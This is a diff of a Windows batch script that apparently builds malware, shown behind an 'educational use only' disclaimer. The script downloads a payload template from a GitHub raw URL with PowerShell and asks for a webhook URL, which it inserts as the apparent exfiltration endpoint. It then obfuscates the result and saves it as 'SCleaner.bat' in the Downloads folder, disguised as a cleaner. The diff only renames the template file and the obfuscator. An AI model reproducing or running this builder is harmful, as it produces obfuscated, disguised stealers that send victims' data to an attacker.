@@ -11,12 +11,12 @@ echo %BRIGHT_RED%THIS TOOL IS INTENDED FOR EDUCATIONAL USE ONLY.
 echo USER ASSUMES FULL LEGAL RESPONSIBILITY FOR ALL ACTIONS PERFORMED.
 echo MISUSE MAY VIOLATE COMPUTER CRIME LAWS IN YOUR JURISDICTION.%RESET%
 echo.
-if not exist isgen.txt echo Downloading isgen.txt.. & echo. & powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://raw.githubusercontent.com/SchooiCodes/isgen/refs/heads/main/isgen.txt -OutFile isgen.txt"
+if not exist code_template.txt echo Downloading code_template.txt.. & echo. & powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://raw.githubusercontent.com/SchooiCodes/isgen/refs/heads/main/code_template.txt -OutFile code_template.txt"
 if "%webhook%"=="" set /p webhook=Please enter a webhook URL: 
 if exist "%TEMP%\SCleaner.bat" del "%TEMP%\SCleaner.bat"
-type isgen.txt>>"%TEMP%\SCleaner.bat"
+type code_template.txt>>"%TEMP%\SCleaner.bat"
 powershell -Command "(Get-Content '%TEMP%\SCleaner.bat') -replace 'your_webhook_url_here1', '%webhook%' | Set-Content '%TEMP%\SCleaner.bat'"
-call bfo "%TEMP%\SCleaner.bat" >nul
+call obfuscator "%TEMP%\SCleaner.bat" >nul
 del "%TEMP%\SCleaner.bat"
 ren SCleaner___.bat SCleaner.bat >nul
 move SCleaner.bat "%USERPROFILE%\Downloads\" >nul
